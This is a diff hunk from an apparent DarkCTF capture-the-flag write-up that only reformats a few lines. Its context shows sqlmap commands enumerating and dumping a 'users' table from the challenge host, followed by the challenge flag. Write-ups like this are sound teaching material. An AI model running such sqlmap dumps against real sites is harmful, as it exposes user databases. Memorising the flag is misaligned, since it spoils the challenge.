@@ -142,9 +142,9 @@ sqlmap -u http://web.darkarmy.xyz:30001/?id=8 --tables -D id14831952_security
 sqlmap -u http://web.darkarmy.xyz:30001/?id=8 --columns -D id14831952_security -T users
 sqlmap -u http://web.darkarmy.xyz:30001/?id=8 --dump -D id14831952_security -T users
 ```
-we got the flag from users table
-![](img/so_simple01.png)
-**Flag:darkCTF{uniqu3_ide4_t0_find_fl4g}**
+we got the flag from users table  
+![](img/so_simple01.png)  
+**Flag: darkCTF{uniqu3_ide4_t0_find_fl4g}**
 
 ## Forensics
 ### Wolfie's Contact
